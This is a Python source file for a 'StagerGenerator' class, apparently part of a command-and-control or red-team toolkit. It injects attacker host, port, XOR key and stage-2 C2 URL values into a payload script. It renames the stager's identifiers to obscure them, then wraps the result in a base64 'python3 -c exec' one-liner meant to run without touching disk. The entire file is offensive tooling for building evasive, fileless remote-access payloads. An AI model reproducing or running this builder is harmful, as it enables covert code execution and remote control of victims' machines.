import base64
import zlib
import os
import random
import string
import re

class StagerGenerator:
    def __init__(self, file_path):
        self.file_path = file_path
        self.code = self._load_file()

    def _load_file(self):
        if not os.path.exists(self.file_path):
            raise FileNotFoundError(f"Payload file not found at: {self.file_path}")
        with open(self.file_path, 'r') as f:
            return f.read()

    def get_raw_payload(self, lhost, lport, xor_key, stage2url=None, obfuscate=True):
        """
        Reads ANY python file, auto-injects networking variables, and optionally obfuscates it.
        """
        generated_code = self.code

        # Broad Regex to replace ANY standard networking variables in the target Python script
        # Matches HOST, LHOST, RHOST, C2_HOST, _A, a
        generated_code = re.sub(r'((?:LHOST|RHOST|HOST|C2_HOST|_A|a)\s*=\s*")[^"]+(")', fr'\g<1>{lhost}\g<2>', generated_code)
        
        # Matches PORT, LPORT, RPORT, C2_PORT, _B, b
        generated_code = re.sub(r'((?:LPORT|RPORT|PORT|C2_PORT|_B|b)\s*=\s*)\d+', fr'\g<1>{lport}', generated_code)
        
        # Matches KEY, XOR_KEY, _K, k
        generated_code = re.sub(r'((?:KEY|XOR_KEY|_K|k)\s*=\s*")[^"]+(")', fr'\g<1>{xor_key}\g<2>', generated_code)

        # Matches C2_URL, STAGE2URL, STAGE2_URL for beacon payloads
        if stage2url:
            generated_code = re.sub(r'((?:C2_URL|STAGE2URL|STAGE2_URL)\s*=\s*")[^"]+(")', fr'\g<1>{stage2url}\g<2>', generated_code)

        # Catch manual fallback placeholders from previous iterations
        generated_code = generated_code.replace("IP_REPLACE_ME", str(lhost))
        generated_code = generated_code.replace("99999", str(lport))
        generated_code = generated_code.replace("KEY_REPLACE_ME", str(xor_key))

        # check for stage 2 url flag
        if stage2url:
            generated_code = generated_code.replace("URL_REPLACE_ME", str(stage2url))

        if obfuscate:
            # Basic string and class obfuscation for generic payloads (safely targets stagers)
            replacements = {
                "class Stager:": "class _X:",
                "def __init__(self, host, port, key, c2_url):": "def __init__(self, h, p, k, c):",
                "Stager(HOST, PORT, KEY, C2_URL)": "_X(HOST, PORT, KEY, C2_URL)",
                "self.host = host": "self._h = h",
                "self.port = port": "self._p = p",
                "self.key = key": "self._k = k",
                "self.c2_url = c2_url": "self._c = c",
                "self.host": "self._h",
                "self.port": "self._p",
                "self.key": "self._k",
                "self.c2_url": "self._c",
                "self.client_socket": "self._cs",
                "self.connect": "self._cn",
                "self.receive_payload": "self._rp",
                "self.execute_payload": "self._ep",
                "self.cleanup": "self._cu",
                "self._recv_all": "self._ra",
                "def connect(self):": "def _cn(self):",
                "def receive_payload(self):": "def _rp(self):",
                "def execute_payload(self, obfuscated_payload):": "def _ep(self, obfuscated_payload):",
                "def cleanup(self):": "def _cu(self):",
                "def _recv_all(self, n):": "def _ra(self, n):",
            }
            for old, new in replacements.items():
                generated_code = generated_code.replace(old, new)

        return generated_code

    def generate_payload(self, lhost, lport, xor_key, stage2url=None, obfuscate=True):
        generated_code = self.get_raw_payload(lhost, lport, xor_key, stage2url, obfuscate)

        # Base64 encode the final script to avoid touching the local and target disk
        encoded_payload = base64.b64encode(generated_code.encode()).decode()
        
        # Formulate the Python one-liner using dynamic resolution and web-safe character restoration
        oneliner = f"python3 -c \"exec(__import__('base64').b64decode(b'{encoded_payload}'.replace(b' ', b'+')))\""
        
        return oneliner
